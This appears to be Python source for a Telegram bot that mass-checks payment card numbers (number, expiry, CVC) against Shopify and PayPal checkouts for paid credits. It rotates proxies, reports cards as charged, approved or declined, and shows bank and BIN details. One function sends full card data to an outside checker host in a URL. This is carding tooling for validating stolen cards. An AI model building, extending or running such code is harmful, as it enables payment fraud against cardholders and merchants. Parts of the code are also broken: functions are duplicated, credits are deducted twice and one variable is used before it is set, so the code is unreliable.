        result = await shopify2_check(card_text)
        
        # Format response - PURE API RESPONSE
        safe_card = result['card'].replace('_', r'\_').replace('*', r'\*')
        api_response = result['message'].replace('`', '\\`').replace('*', '\\*')[:3000]
        
        response_text = f"""
🛍️ **SHOPIFY2 CHECK** (API)
━━━━━━━━━━━━━━━━━━━━
💳 Card: `{safe_card}`
📊 Status Code: {result['status']}
⏱️ Time: {result['elapsed']}

📝 **API Response:**
```
{api_response}
```

**Gateway:** Shopify Payments
**Proxy:** Live

👤 Checked by: @{username}
━━━━━━━━━━━━━━━━━━━━
"""
        
        await checking_msg.edit_text(response_text, parse_mode='HTML')
        
    except Exception as e:
        logger.exception(f"shopify2_cmd error: {e}")
        await checking_msg.edit_text(f"❌ Error: {str(e)[:100]}")


async def mshopify2_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /mshopify2 [cards]
    Mass check cards via Shopify2 API from uploaded text file or pasted text
    
    Reply to a file with one card per line, or paste cards directly
    Format: 4532015112830366|12|25|123 or 4532015112830366 12 25 123
    """
    msg, user, user_id, username = get_msg_user_info(update)
    
    # Check if replying to file or providing cards as argument
    if update.message.reply_to_message:
        if update.message.reply_to_message.document:
            file_id = update.message.reply_to_message.document.file_id
            file_name = update.message.reply_to_message.document.file_name or "cards.txt"
            
            try:
                # Download file
                file = await context.bot.get_file(file_id)
                file_content = await file.download_as_bytearray()
                text_content = file_content.decode('utf-8', errors='ignore')
            except Exception as e:
                await msg.reply_text(f"❌ Failed to download file: {e}")
                return
        elif update.message.reply_to_message.text:
            text_content = update.message.reply_to_message.text
            file_name = "cards.txt"
        else:
            await msg.reply_text("❌ Please reply to a text file or message with cards")
            return
    elif context.args and len(context.args) > 0:
        text_content = " ".join(context.args)
        file_name = "inline_cards.txt"
    else:
        await msg.reply_text(
            "❌ Invalid format.\n\n"
            "Usage: /mshopify2 [cards]\n"
            "Or reply to a file with cards"
        )
        return
    
    # Parse cards from content
    cards = parse_cards_from_text(text_content, max_cards=100)
    
    if not cards:
        await msg.reply_text("❌ No valid cards found in text")
        return
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits < len(cards):
        await msg.reply_text(
            f"❌ Insufficient credits.\n"
            f"You have: {credits}\n"
            f"Cards to check: {len(cards)}"
        )
        return
    
    # Start checking
    start_msg = await msg.reply_text(
        f"🔍 **Shopify2 Mass Check** (Haters API)\n\n"
        f"📊 Total Cards: {len(cards)}\n"
        f"🌐 Site: {SHOPIFY2_SITE}\n"
        f"👤 User: @{username}\n\n"
        f"⏳ Starting checks...",
        parse_mode='HTML'
    )
    
    # Deduct credits upfront
    deduct_credit(user_id, len(cards))
    
    results = {
        'approved': 0,
        'declined': 0,
        'error': 0,
        'cards_checked': 0,
        'total_time': 0,
        'details': []
    }
    
    start_time = time.time()
    
    # Check each card
    for i, card in enumerate(cards, 1):
        if i % 10 == 0 or i == len(cards):
            # Update progress every 10 cards
            elapsed = time.time() - start_time
            progress = f"Progress: {i}/{len(cards)} | Elapsed: {elapsed:.1f}s"
            try:
                await start_msg.edit_text(
                    f"🔍 **Shopify2 Mass Check**\n\n"
                    f"📊 {progress}\n"
                    f"✅ Approved: {results['approved']}\n"
                    f"❌ Declined: {results['declined']}\n"
                    f"⚠️ Errors: {results['error']}",
                    parse_mode='HTML'
                )
            except:
                pass
        
        try:
            result = await shopify2_check(card)
            results['cards_checked'] += 1
            
            # Check for status in response
            response_text = result['message'].lower()
            if 'approved' in response_text or 'live' in response_text or 'order_paid' in response_text:
                results['approved'] += 1
                card_status = "✅"
            elif 'declined' in response_text or 'false' in response_text:
                results['declined'] += 1
                card_status = "❌"
            else:
                results['error'] += 1
                card_status = "⚠️"
            
            results['details'].append({
                'card': result['card'],
                'status': card_status,
                'message': result['message'][:50]
            })
            
        except Exception as e:
            results['error'] += 1
            logger.warning(f"Card check failed: {e}")
    
    results['total_time'] = time.time() - start_time
    
    # Create results file
    results_text = f"🛍️ SHOPIFY2 (HATERS) MASS CHECK RESULTS\n"
    results_text += f"{'='*50}\n"
    results_text += f"Site: {SHOPIFY2_SITE}\n"
    results_text += f"Gateway: Shopify Payments\n"
    results_text += f"Proxy: Live\n"
    results_text += f"Total Cards: {len(cards)}\n"
    results_text += f"Checked: {results['cards_checked']}\n"
    results_text += f"{'='*50}\n\n"
    results_text += f"✅ Approved: {results['approved']}\n"
    results_text += f"❌ Declined: {results['declined']}\n"
    results_text += f"⚠️ Errors: {results['error']}\n"
    results_text += f"⏱️ Total Time: {results['total_time']:.2f}s\n"
    results_text += f"🚀 Speed: {len(cards)/results['total_time']*60:.1f} cards/min\n"
    results_text += f"{'='*50}\n\n"
    results_text += "DETAILED RESULTS:\n"
    results_text += f"{'='*50}\n"
    
    for detail in results['details']:
        results_text += f"{detail['status']} {detail['card']}\n"
        results_text += f"   └─ {detail['message']}\n\n"
    
    # Send results
    results_file = io.BytesIO(results_text.encode())
    results_file.name = "shopify2_results.txt"
    
    try:
        await context.bot.send_document(
            chat_id=msg.chat_id,
            document=InputFile(results_file),
            caption=f"✅ Check Complete\n\n"
                    f"Approved: {results['approved']} | "
                    f"Declined: {results['declined']} | "
                    f"Errors: {results['error']}"
        )
    except Exception as e:
        logger.warning(f"Failed to send results file: {e}")
        await msg.reply_text(f"✅ Check Complete\n\n{results_text[:1000]}")
    
    try:
        await start_msg.delete()
    except:
        pass


async def mshopify_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /mshopify <site>
    Mass check cards from uploaded text file or pasted text
    
    Reply to a file with one card per line, or paste cards directly
    Format: 4532015112830366|12|25|123 or 4532015112830366 12 25 123
    """
    msg, user, user_id, username = get_msg_user_info(update)
    
    # Check if replying to file or providing cards as argument
    if update.message.reply_to_message:
        if update.message.reply_to_message.document:
            file_id = update.message.reply_to_message.document.file_id
            file_name = update.message.reply_to_message.document.file_name or "cards.txt"
            
            try:
                # Download file
                file = await context.bot.get_file(file_id)
                file_content = await file.download_as_bytearray()
                text_content = file_content.decode('utf-8', errors='ignore')
            except Exception as e:
                await msg.reply_text(f"❌ Failed to download file: {e}")
                return
        elif update.message.reply_to_message.text:
            text_content = update.message.reply_to_message.text
            file_name = "cards.txt"
        else:
            await msg.reply_text("❌ Please reply to a text file or message with cards")
            return
    elif context.args and len(context.args) > 0:
        # Check if first arg is site URL
        if context.args[0].startswith(('http://', 'https://', 'www.')):
            site = context.args[0]
            text_content = " ".join(context.args[1:])
            if not text_content:
                await msg.reply_text("❌ Please provide cards after the site URL")
                return
            file_name = "inline_cards.txt"
        else:
            await msg.reply_text(
                "❌ Invalid format.\n\n"
                "Usage: /mshopify <site_url> [cards]\n"
                "Or reply to a file: /mshopify <site_url>"
            )
            return
    else:
        await msg.reply_text(
            "❌ Invalid format.\n\n"
            "Usage: /mshopify <site_url> [cards]\n"
            "Or reply to a file with cards"
        )
        return
    
    # Parse site from arguments if not already set
    if not context.args or not context.args[0].startswith(('http://', 'https://')):
        await msg.reply_text("❌ First argument must be a site URL (https://example.com)")
        return
    
    site = context.args[0]
    if not site.startswith(('http://', 'https://')):
        site = 'https://' + site
    
    # Parse cards from content
    cards = parse_cards_from_text(text_content, max_cards=100)
    
    if not cards:
        await msg.reply_text("❌ No valid cards found in text")
        return
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits < len(cards):
        await msg.reply_text(
            f"❌ Insufficient credits.\n"
            f"You have: {credits}\n"
            f"Cards to check: {len(cards)}"
        )
        return
    
    # Start checking
    start_msg = await msg.reply_text(
        f"🔍 **Autoshopify Mass Check**\n\n"
        f"📊 Total Cards: {len(cards)}\n"
        f"🌐 Site: {site[:40]}...\n"
        f"👤 User: @{username}\n\n"
        f"⏳ Starting checks...",
        parse_mode='HTML'
    )
    
    # Deduct credits upfront
    deduct_credit(user_id, len(cards))
    
    results = {
        'charged': 0,
        'declined': 0,
        'error': 0,
        'cards_checked': 0,
        'total_time': 0,
        'details': []
    }
    
    start_time = time.time()
    
    # Check each card
    for i, card in enumerate(cards, 1):
        if i % 10 == 0 or i == len(cards):
            # Update progress every 10 cards
            elapsed = time.time() - start_time
            progress = f"Progress: {i}/{len(cards)} | Elapsed: {elapsed:.1f}s"
            try:
                await start_msg.edit_text(
                    f"🔍 **Autoshopify Mass Check**\n\n"
                    f"📊 {progress}\n"
                    f"✅ Charged: {results['charged']}\n"
                    f"❌ Declined: {results['declined']}\n"
                    f"⚠️ Errors: {results['error']}",
                    parse_mode='HTML'
                )
            except:
                pass
        
        try:
            result = await shopify_check(site, card)
            results['cards_checked'] += 1
            
            if 'Charged' in result['status']:
                results['charged'] += 1
                card_status = "✅"
            elif 'Declined' in result['status']:
                results['declined'] += 1
                card_status = "❌"
            else:
                results['error'] += 1
                card_status = "⚠️"
            
            results['details'].append({
                'card': result['card'],
                'status': result['status'],
                'message': result['message'][:50]
            })
            
        except Exception as e:
            results['error'] += 1
            logger.warning(f"Card check failed: {e}")
    
    results['total_time'] = time.time() - start_time
    
    # Create results file
    results_text = f"🛍️ AUTOSHOPIFY MASS CHECK RESULTS\n"
    results_text += f"{'='*50}\n"
    results_text += f"Site: {site}\n"
    results_text += f"Total Cards: {len(cards)}\n"
    results_text += f"Checked: {results['cards_checked']}\n"
    results_text += f"{'='*50}\n\n"
    results_text += f"✅ Charged: {results['charged']}\n"
    results_text += f"❌ Declined: {results['declined']}\n"
    results_text += f"⚠️ Errors: {results['error']}\n"
    results_text += f"⏱️ Total Time: {results['total_time']:.2f}s\n"
    results_text += f"🚀 Speed: {len(cards)/results['total_time']*60:.1f} cards/min\n"
    results_text += f"{'='*50}\n\n"
    results_text += "DETAILED RESULTS:\n"
    results_text += f"{'='*50}\n"
    
    for detail in results['details']:
        results_text += f"{detail['status']} {detail['card']}\n"
        results_text += f"   └─ {detail['message']}\n\n"
    
    # Send results
    results_file = io.BytesIO(results_text.encode())
    results_file.name = "autoshopify_results.txt"
    
    try:
        await context.bot.send_document(
            chat_id=msg.chat_id,
            document=InputFile(results_file),
            caption=f"✅ Check Complete\n\n"
                    f"Charged: {results['charged']} | "
                    f"Declined: {results['declined']} | "
                    f"Errors: {results['error']}"
        )
    except Exception as e:
        logger.warning(f"Failed to send results file: {e}")
        await msg.reply_text(f"✅ Check Complete\n\n{results_text[:1000]}")
    
    try:
        await start_msg.delete()
    except:
        pass


# ======================= END AUTOSHOPIFY INTEGRATION =======================

# ---------------------- PayPal COMMAND ---------------------- #
async def pp_command(update: 'Update' = None,
                     context: 'ContextTypes.DEFAULT_TYPE' = None,
                     card_details: str = None,
                     username: str = None,
                     user_id: int = None,
                     msg=None,
                     proxy_list=None):

    if update:
        msg, user, user_id, username = get_msg_user_info(update)
        args = context.args if context and getattr(context, "args", None) else []
        if args:
            card_details = " ".join(args)
    else:
        if not all([card_details, username, user_id]):
            print("Missing required params for internal pp_command call.")
            return

    # Start message
    if msg:
        await msg.reply_text(f"𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂 ⭟ {card_details}")
    else:
        print(f"𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂 ⭌ {card_details} 𝙁𝙊𝙍 𝙐𝙎𝙀𝙍 ⭌ ࿇ {username}")

    # Add user
    try:
        add_user(user_id, username)
    except Exception as e:
        logger.warning(f"add_user failed in pp_command: {e}")

    # Check credits
    try:
        credits = get_user_credits(user_id)
    except Exception as e:
        logger.warning(f"get_user_credits failed in pp_command: {e}")
        credits = 0

    if credits < 1:
        text = "❌ 𝙄𝙉𝙎𝙐𝙁𝙁. 𝙘𝙧𝙚𝙙𝙞𝙩𝙨\nYou need 1 credit to check.\nUse /redeem to add credits."
        if msg:
            await msg.reply_text(text)
        else:
            print(text)
        return

    # Deduct credit
    try:
        deduct_credit(user_id)
    except Exception as e:
        logger.warning(f"deduct_credit failed for user {user_id}: {e}")

    # Processing message
    sent_msg = None
    if msg:
        sent_msg = await msg.reply_text(
            "<blockquote>𝘾𝙤𝙤𝙠𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙘𝙖𝙧𝙙...</blockquote>",
            parse_mode="HTML"
        )

    # Perform check with proxy
    try:
        resp = await pp_check(card_details, username, msg, proxy_list)
    except Exception as e:
        logger.exception(f"pp_check() raised exception for card {card_details}: {e}")
        if sent_msg:
            await sent_msg.edit_text(f"Error: {e} ❌")
        else:
            print(f"Error: {e}")
        return

    # Format response
    if not isinstance(resp, dict):
        response_text = f"Error: {resp}"
    else:
        status = resp.get("status", "Unknown")
        proxy_info = resp.get("proxy_info", "")
        response_text = f"""PayPal 𝘾𝙃𝘼𝙍𝙂𝙀 ༐ 𝙏𝙀𝘾𝙃𝙓𝙃𝙐𝘽
━━━━━━━━━━━━━
♞ 𝘾𝙖𝙧𝙙 ⤏ {resp.get('full_card')}
♜ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ⤏ PayPal
⁠✧ 𝙎𝙩𝙖𝙩𝙪𝙨 ⤏ {status}
♛ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ⤏ {resp.get('response','')[:120]}
━━━━━━━━━━━━━
{proxy_info}
━━━━━━━━━━━━━
Checked by ➪ @{username} (PREMIUM)
Dev ➬ @technopile
━━━━━━━━━━━━━
▶ 𝙏𝙞𝙢𝙚 [{resp.get('elapsed_time','')}]
Credits Left: ({get_user_credits(user_id)})"""

    # Send or update
    try:
        if sent_msg:
            await sent_msg.edit_text(response_text, parse_mode='HTML')
        elif msg:
            await msg.reply_text(response_text, parse_mode='HTML')
        else:
            print(response_text)
    except Exception as e:
        logger.warning(f"Could not send Telegram message: {e}")
        if msg:
            await msg.reply_text(response_text, parse_mode='HTML')
        else:
            print(response_text)
            
            
            
            
import asyncio
import time
import re
import requests
import logging

logger = logging.getLogger(__name__)

# ---------------------- RAZORPAY CHECK ---------------------- #
async def pp_check(card_details, username, msg=None, proxy_list=None):
    proxy_info = ""
    proxy = None

    # --- Proxy handling ---
    if proxy_list:
        proxy = get_random_proxy()
        if proxy:
            proxy_host = proxy['http'].split('@')[-1]
            is_working, proxy_ms = await asyncio.to_thread(test_proxy, proxy)
            if is_working:
                proxy_info = f"𝙋𝙍𝙊𝙓𝙔 ⛖ `{proxy_host}` ({proxy_ms}ms)"
            else:
                proxy_info = f"⚠️ Proxy: `{proxy_host}` (Not responding)"
                proxy = None  # fallback to direct

    if msg:
        await msg.reply_text(f"Checking: {card_details}\n{proxy_info}")
    else:
        print(f"Checking: {card_details} for user {username}")
        if proxy_info:
            print(proxy_info)

    # --- Parse card ---
    text = card_details.strip()
    pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
    match = re.search(pattern, text)
    if not match:
        return {"status": "Error", "response": "Invalid card format.", "full_card": text}

    n, mm_raw, yy_raw, cvc = match.groups()
    mm = mm_raw.zfill(2)
    if len(yy_raw) == 4 and yy_raw.startswith("20"):
        yy = yy_raw[2:]
    elif len(yy_raw) == 2:
        yy = yy_raw
    else:
        return {"status": "Error", "response": "Invalid year format.", "full_card": text}

    full_card = f"{n}|{mm}|{yy}|{cvc}"
    start_time = time.time()

    # --- HTTP request with optional proxy ---
    try:

        url = f"https://paypal.cxchk.site/gate=pp1/cc={full_card}?proxy={proxy}"
        req_kwargs = {"timeout": 15}
        if proxy:
            req_kwargs["proxies"] = proxy

        resp_text = await asyncio.to_thread(lambda: requests.get(url, **req_kwargs).text)
        resp_lower = resp_text.lower()
        
        if "charged" in resp_lower:
            status = "Charged 🙀"
        elif "declined" in resp_lower:
            status = "Declined ❌"
        elif "approved" in resp_lower:
            status = "Approved 💎"
        else:
            status = "Unknown ⚠️"

        elapsed = round(time.time() - start_time, 2)

        return {
            "status": status,
            "response": resp_text[:200],
            "full_card": full_card,
            "elapsed_time": f"{elapsed}s",
            "proxy_info": proxy_info
        }

    except Exception as e:
        logger.exception(f"pp_check() raised exception for card {card_details}: {e}")
        return {"status": "Error", "response": str(e), "full_card": full_card, "proxy_info": proxy_info}



    
    
async def sh_command(update: Update = None,
                     context: ContextTypes.DEFAULT_TYPE = None,
                     card_details: str = None,
                     username: str = None,
                     user_id: int = None,
                     msg=None):
    # This function supports both Telegram command invocation and internal loop calls.
    # If update is provided, treat as Telegram invocation; else treat as internal.

    # Detect invocation type
    if update:
        msg, user, user_id, username = get_msg_user_info(update)
        args = context.args if context and getattr(context, "args", None) else []
        if args:
            card_details = " ".join(args)
    else:
        # internal call should pass card_details, username, user_id, msg at least
        if not all([card_details, username, user_id]):
            print("Missing required params for internal sh_command call.")
            return
    
    if msg:
        await msg.reply_text(f"𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂 ⭟ {card_details}")
    else:
        print(f"𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂 ⭌ {card_details} 𝙁𝙊𝙍 𝙐𝙎𝙀𝙍 ⭌ ࿇ {username}")

    # add user
    try:
        add_user(user_id, username)
    except Exception as e:
        logger.warning(f"add_user failed in sh_command: {e}")

    # credits check
    credits = 0
    try:
        credits = get_user_credits(user_id)
    except Exception as e:
        logger.warning(f"get_user_credits failed in sh_command: {e}")

    if credits < 1:
        if msg:
            await msg.reply_text("❌ 𝙄𝙉𝙎𝙐𝙁𝙁. 𝙘𝙧𝙚𝙙𝙞𝙩𝙨\n 𝙔𝙤𝙪 𝙣𝙚𝙚𝙙 𝙤𝙣𝙚 𝙘𝙧𝙚𝙙𝙞𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠\n𝙐𝙎𝙀 /redeem 𝙩𝙤 𝙧𝙚𝙙𝙚𝙚𝙢 𝙘𝙧𝙚𝙙𝙞𝙩𝙨.")
        else:
            print("❌ Insufficient credits!")
        return

    if not card_details:
        if msg and hasattr(msg, "text"):
            full = msg.text.strip()
            parts = full.split(maxsplit=1)
            if len(parts) >= 2:
                card_details = parts[1]
        else:
            print("𝙁𝙤𝙧𝙢𝙖𝙩𝙩 𝙞𝙣𝙫𝙖𝙡𝙞𝙙")
        if not card_details:
            if msg:
                await msg.reply_text("𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙁𝙤𝙧𝙢𝙖𝙩𝙩 \n 𝙐𝙎𝙀 /sh cardnumber|mm|yy|cvc")
            return

    # deduct credit
    try:
        deduct_credit(user_id)
    except Exception as e:
        logger.warning(f"deduct_credit failed for user {user_id}: {e}")

    # send waiting message
    sent_msg = None
    if msg:
        sent_msg = await msg.reply_text("<blockquote>𝘾𝙤𝙤𝙠𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙘𝙖𝙧𝙙........</blockquote>",parse_mode="HTML")

    # call the main checker function (sh_check) – handle async/sync
    try:
        if asyncio.iscoroutinefunction(sh_check):
            result = await sh_check(card_details, username)
        else:
            result = await asyncio.to_thread(sh_check, card_details, username)
    except Exception as e:
        logger.exception(f"sh_check() raised exception for card {card_details}: {e}")
        if sent_msg:
            await sent_msg.edit_text(f"Error: {e} ❌")
        else:
            print(f"Error: {e}")
        return

    # build response text
    if isinstance(result, str):
        response_text = f"Error: {result} ❌"
    else:
        if "Charged" in result.get('status', ''):
            status_emoji = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 💎"
            response_format = f"⤿{result.get('resp_msg','')}⤾"
        else:
            status_emoji = result.get('status', '')
            response_format = result.get('resp_msg', '')

        bin_info = result.get('bin_info', {})
        remaining_credits = get_user_credits(user_id)

        response_text = f"""𝙎𝙃𝙊𝙋𝙄𝙁𝙔 𝘾𝙃𝘼𝙍𝙂𝙀 ༐ 𝙏𝙀𝘾𝙃𝙓𝙃𝙐𝘽 (/sh) 
━━━━━━━━━━━━━
♞ 𝘾𝙖𝙧𝙙 ⤏ {result.get('full_card')}
♜ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ⤏ 𝙨𝙝𝙤𝙥𝙞𝙛𝙮 5$
⁠✧ 𝙎𝙩𝙖𝙩𝙪𝙨 ⤏ {status_emoji}
♛ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ⤏ {response_format}
━━━━━━━━━━━━━
<blockquote> 𝘽𝙞𝙣 ⭆ {result.get('bin')}
⚉ 𝙄𝙣𝙛𝙤 ⭆ {bin_info.get('scheme','')} - {bin_info.get('type','')} - PERSONAL
⛃ 𝘽𝙖𝙣𝙠 ⭆ {bin_info.get('bank','')}
❆ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ⭆ {bin_info.get('country','')} - {bin_info.get('emoji','')} </blockquote>
━━━━━━━━━━━━━
 𝙘𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 ➪ @{username} (PREMIUM) 
 𝘿𝙚𝙫 ➬ {result.get('dev','')} - {result.get('dev_emoji','')}
━━━━━━━━━━━━━
▶𝙏𝙞𝙢𝙚 [{result.get('elapsed_time','')}] | Credits: ({remaining_credits}) 𝙎𝙩𝙖𝙩𝙪𝙨 ☛ (Live)"""

    # send or edit reply
    try:
        if sent_msg:
            await sent_msg.edit_text(response_text, parse_mode='HTML')
        elif msg:
            await msg.reply_text(response_text, parse_mode='HTML')
        else:
            print(response_text)
    except Exception as e:
        logger.warning(f"Could not send Telegram message: {e}")
        if msg:
            await msg.reply_text(response_text, parse_mode='HTML')
        else:
            print(response_text)
            
            
async def sh_command(update: Update = None,
                     context: ContextTypes.DEFAULT_TYPE = None,
                     card_details: str = None,
                     username: str = None,
                     user_id: int = None,
                     msg=None):
    # This function supports both Telegram command invocation and internal loop calls.
    # If update is provided, treat as Telegram invocation; else treat as internal.

    # Detect invocation type
    if update:
        msg, user, user_id, username = get_msg_user_info(update)
        args = context.args if context and getattr(context, "args", None) else []
        if args:
            card_details = " ".join(args)
    else:
        # internal call should pass card_details, username, user_id, msg at least
        if not all([card_details, username, user_id]):
            print("Missing required params for internal sh_command call.")
            return
    
    if msg:
        await msg.reply_text(f"𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂 ⭟ {card_details}")
    else:
        print(f"𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂 ⭌ {card_details} 𝙁𝙊𝙍 𝙐𝙎𝙀𝙍 ⭌ ࿇ {username}")

    # add user
    try:
        add_user(user_id, username)
    except Exception as e:
        logger.warning(f"add_user failed in sh_command: {e}")

    # credits check
    credits = 0
    try:
        credits = get_user_credits(user_id)
    except Exception as e:
        logger.warning(f"get_user_credits failed in sh_command: {e}")

    if credits < 1:
        if msg:
            await msg.reply_text("❌ 𝙄𝙉𝙎𝙐𝙁𝙁. 𝙘𝙧𝙚𝙙𝙞𝙩𝙨\n 𝙔𝙤𝙪 𝙣𝙚𝙚𝙙 𝙤𝙣𝙚 𝙘𝙧𝙚𝙙𝙞𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠\n𝙐𝙎𝙀 /redeem 𝙩𝙤 𝙧𝙚𝙙𝙚𝙚𝙢 𝙘𝙧𝙚𝙙𝙞𝙩𝙨.")
        else:
            print("❌ Insufficient credits!")
        return

    if not card_details:
        if msg and hasattr(msg, "text"):
            full = msg.text.strip()
            parts = full.split(maxsplit=1)
            if len(parts) >= 2:
                card_details = parts[1]
        else:
            print("𝙁𝙤𝙧𝙢𝙖𝙩𝙩 𝙞𝙣𝙫𝙖𝙡𝙞𝙙")
        if not card_details:
            if msg:
                await msg.reply_text("𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙁𝙤𝙧𝙢𝙖𝙩𝙩 \n 𝙐𝙎𝙀 /sh cardnumber|mm|yy|cvc")
            return

    # deduct credit
    try:
        deduct_credit(user_id)
    except Exception as e:
        logger.warning(f"deduct_credit failed for user {user_id}: {e}")

    # send waiting message
    sent_msg = None
    if msg:
        sent_msg = await msg.reply_text("<blockquote>𝘾𝙤𝙤𝙠𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙘𝙖𝙧𝙙........</blockquote>",parse_mode="HTML")

    # call the main checker function (sh_check) – handle async/sync
    try:
        if asyncio.iscoroutinefunction(sh_check):
            result = await sh_check(card_details,username)
        else:
            pass
    except Exception as e:
        logger.exception(f"sh_check() raised exception for card {card_details}: {e}")
        if sent_msg:
            await sent_msg.edit_text(f"Error: {e} ❌")
        else:
            print(f"Error: {e}")
        return

    # build response text
    if isinstance(result, str):
        response_text = f"Error: {result} ❌"
    else:
        if "Approved" in result:
            status_emoji = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 💎"
            response_format = f"⤿{result.get('resp_msg','')}⤾"
        elif "Declined" in result:
            status_emoji = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
            response_format = result.get('resp_msg', '')
        else:
            status_emoji = result.get('status', '')
            response_format = result.get('resp_msg', '')

        bin_info = result.get('bin_info', {})
        remaining_credits = get_user_credits(user_id)

        response_text = f"""SHOPIFY 𝘾𝙃𝘼𝙍𝙂𝙀 ༐ 𝙏𝙀𝘾𝙃𝙓𝙃𝙐𝘽 (/sh) 
━━━━━━━━━━━━━
♞ 𝘾𝙖𝙧𝙙 ⤏ {result.get('full_card')}
♜ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ⤏ SHOPIFY 1$
⁠✧ 𝙎𝙩𝙖𝙩𝙪𝙨 ⤏ {status_emoji}
♛ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ⤏ {response_format}
━━━━━━━━━━━━━
<blockquote> 𝘽𝙞𝙣 ⭆ {result.get('bin')}
⚉ 𝙄𝙣𝙛𝙤 ⭆ {bin_info.get('scheme','')} - {bin_info.get('type','')} - PERSONAL
⛃ 𝘽𝙖𝙣𝙠 ⭆ {bin_info.get('bank','')}
❆ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ⭆ {bin_info.get('country','')} - {bin_info.get('emoji','')} </blockquote>
━━━━━━━━━━━━━
 𝙘𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 ➪ @{username} (PREMIUM) 
 𝘿𝙚𝙫 ➬ {result.get('dev','')} - {result.get('dev_emoji','')}
━━━━━━━━━━━━━
▶𝙏𝙞𝙢𝙚 [{result.get('elapsed_time','')}] | Credits: ({remaining_credits}) 𝙎𝙩𝙖𝙩𝙪𝙨 ☛ (Live)"""

    # send or edit reply
    try:
        if sent_msg:
            await sent_msg.edit_text(response_text, parse_mode='HTML')
        elif msg:
            await msg.reply_text(response_text, parse_mode='HTML')
        else:
            print(response_text)
    except Exception as e:
        logger.warning(f"Could not send Telegram message: {e}")
        if msg:
            await msg.reply_text(response_text, parse_mode='HTML')
        else:
            print(response_text)
            

# ---------------- Mass-check helpers (process_card_list) ----------------
async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, username: str):
    msg, user, user_id, username = get_msg_user_info(update)

    # User ID
    user_id = update.effective_user.id

    # Ensure registration
    db = await load_user_db()
    if str(user.id) not in db:
        return await update.message.reply_text(
            "Welcome! You must register first using /register before using this bot."
        )

    # Basic username fallback
    if not username:
        username = "USER"

    # Empty cards
    if not cards:
        return await msg.reply_text("No valid cards found to check.")

    # Card limit
    total_cards = len(cards)
    if total_cards > 1000:
        return await msg.reply_text(
            f"𝙏𝙊𝙊 𝙈𝘼𝙉𝙔 𝘾𝘼𝙍𝘿𝙎┥┝ 1000 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 𝙉𝙊𝙏 ┮ {total_cards}."
        )

    # Check credits
    credits = get_user_credits(user_id)
    if credits < total_cards:
        return await msg.reply_text(
            f"❌ Insufficient credits! You have {credits} credits but need {total_cards}."
        )

    # Deduct credits upfront
    deduct_credit(user_id, total_cards)

    # Create new job
    job_id = f"JOB_{user_id}_{int(time.time())}"

    # Notify user
    await msg.reply_text(
        f"🧪 Starting check on {total_cards} cards...\n"
        f"🔹 1 worker per chat\n"
        f"🔹 Parallel processing via thread pool\n"
        f"🔹 Job ID: {job_id}"
    )

    await msg.reply_text("Cards are queued! Working...")


    proxy_info = ""
    if proxy_list:
        proxy = get_random_proxy()
        if proxy:
            proxy_host = proxy['http'].split('@')[-1]
            is_working, proxy_ms = await asyncio.to_thread(test_proxy, proxy)
            if is_working:
                proxy_info = f"𝙋𝙍𝙊𝙓𝙔 ⛖  `{proxy_host}` ({proxy_ms}ms)"
            else:
                proxy_info = f"⚠️ Proxy: `{proxy_host}` (Not responding)"

    start_msg = f"𝘾𝙤𝙤𝙠𝙞𝙣𝙜 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 ⛟ {total_cards} 𝙘𝙖𝙧𝙙𝙨 𝙁𝙤𝙪𝙣𝙙 "
    if proxy_info:
        start_msg += f"\n{proxy_info}"

    await msg.reply_text(start_msg, parse_mode='HTML')

    global CHECKED, TOTAL, CHARGED, ERROR, DECLINED, STOP_CHECKING, DS
    TOTAL = total_cards
    CHECKED = CHARGED = DECLINED = DS = ERROR = 0  # Reset globals if needed
    STOP_CHECKING = False  # Ensure reset at start
    
    bulk_start_time = time.time()  # Initialize bulk_start_time

    progress_message = await msg.reply_text("☸")

    successful = 0
    declined = 0
    errors = 0
    ds = 0

    for i, card_details in enumerate(cards):
        if STOP_CHECKING == True:
            break  # Stop if /stop was called

        try:
            deduct_credit(user_id, total_cards)
        except Exception as e:
            logger.warning(f"deduct_credit failed for {user_id}: {e}")

        if i > 0:
            if asyncio.iscoroutinefunction(random_delay):
                await random_delay(1, 2)
            else:
                await asyncio.to_thread(random_delay, 1, 2)

        result_text = ""
        try:
            # call sh_check – handle async/sync
            if asyncio.iscoroutinefunction(sh_check):

                final_text = lambda: result.get('resp_msg', '').lower() if isinstance(result, dict) else ""

                result = await sh_check(card_details, username, final_text)
            else:
                result = await asyncio.to_thread(sh_check, card_details, final_text, username)

            if isinstance(result, str):
                card_to_display = card_details
                response_msg = f"Error: {result}"
                errors += 1
            else:
                card_to_display = result.get('full_card', card_details)
                response_msg = result.get('resp_msg', '')
